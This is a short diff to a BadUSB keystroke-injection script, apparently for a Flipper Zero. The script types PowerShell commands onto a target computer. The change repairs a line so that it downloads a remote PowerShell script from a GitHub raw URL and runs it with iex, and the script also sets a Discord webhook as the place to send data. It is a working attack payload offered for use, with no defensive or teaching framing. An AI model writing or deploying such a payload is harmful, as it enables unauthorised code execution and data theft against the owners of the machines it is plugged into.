@@ -16,7 +16,7 @@ DELAY 1000
 REM edit your webhook here
 STRING $DiscordUrl = 'Webhook Link Here'
 ENTER
-STRING iex ((New-Object System.Net.WebClient).DownloadString(.ps1'))
+STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/qqwizzixxxx/flipper-scripts/refs/heads/main/B4dP0w3rSh3ll/Str.ps1'))
 ENTER
 DELAY 500
 STRING version-av
